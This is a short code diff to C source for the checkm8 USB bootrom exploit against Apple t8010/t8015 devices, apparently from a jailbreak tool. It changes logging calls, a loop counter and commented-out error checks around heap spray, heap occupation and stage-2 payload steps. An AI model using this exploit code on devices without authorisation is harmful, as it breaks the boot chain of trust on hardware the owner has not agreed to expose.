@@ -41,12 +41,13 @@ static void heap_spray(io_client_t client)
     
     // For iOS devices (especially older ones)
     // Repeat forever until usb_ctrl_transfer(0x80,6,0x304,0x40a,blank,64) reaches Timeout
-    for(int i=0;i<16384;i++){
+    int i=0;
+    for(i=0;i<16384;i++){
         wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
         result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
         if(result.ret != kIOReturnSuccess) break;
     }
-    DEBUGLOG("[%s] (2/7) %x", __FUNCTION__, result.ret);
+    DEBUGLOG("[%s] (2/7) %x, %d", __FUNCTION__, result.ret, i);
     
     for(int i=0;i<64;i++){
         result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
@@ -147,14 +148,9 @@ int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t
     
     LOG_EXPLOIT_NAME("checkm8");
     
-    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
+    LOG("[%s] reconnecting", __FUNCTION__);
     result = io_reset(client);
-    //if(result != kIOReturnSuccess){
-    //    ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
-    //    io_close(client);
-    //    client = NULL;
-    //    return -1;
-    //}
+    
     io_close(client);
     client = NULL;
     usleep(10000);
@@ -165,17 +161,12 @@ int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t
         return -1;
     }
     
-    LOG_PROGRESS("[%s] running heap_spray()", __FUNCTION__);
+    LOG("[%s] running heap_spray()", __FUNCTION__);
     heap_spray(client);
     
-    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
+    LOG("[%s] reconnecting", __FUNCTION__);
     result = io_reset(client);
-    //if(result != kIOReturnSuccess){
-    //    ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
-    //    io_close(client);
-    //    client = NULL;
-    //    return -1;
-    //}
+    
     io_close(client);
     client = NULL;
     usleep(10000);
@@ -185,18 +176,13 @@ int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t
         return -1;
     }
     
-    LOG_PROGRESS("[%s] running set_global_state()", __FUNCTION__);
+    LOG("[%s] running set_global_state()", __FUNCTION__);
     set_global_state(client);
     
-    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
+    LOG("[%s] reconnecting", __FUNCTION__);
     result = io_reenumerate(client);
     DEBUGLOG("[%s] USBDeviceReEnumerate: %x", __FUNCTION__, result);
-    //if(result != kIOReturnSuccess){
-    //    ERROR("[%s] ERROR: Failed to ReEnumerate to device", __FUNCTION__);
-    //    io_close(client);
-    //    client = NULL;
-    //    return -1;
-    //}
+    
     io_close(client);
     client = NULL;
     usleep(10000);
@@ -206,11 +192,11 @@ int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t
         return -1;
     }
     
-    LOG_PROGRESS("[%s] running heap_occupation()", __FUNCTION__);
+    LOG("[%s] running heap_occupation()", __FUNCTION__);
     usleep(10000);
     heap_occupation(client, cpid, payload);
     
-    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
+    LOG("[%s] reconnecting", __FUNCTION__);
     result = io_reenumerate(client);
     DEBUGLOG("[%s] USBDeviceReEnumerate: %x", __FUNCTION__, result);
     
@@ -223,7 +209,7 @@ int checkra1n_t8010_t8015(io_client_t client, uint16_t cpid, checkra1n_payload_t
         return -1;
     }
     
-    LOG_PROGRESS("[%s] sending stage2 payload", __FUNCTION__);
+    LOG("[%s] sending stage2 payload", __FUNCTION__);
     usleep(10000);
     r = payload_stage2(client, cpid, payload);
     if(r != 0){
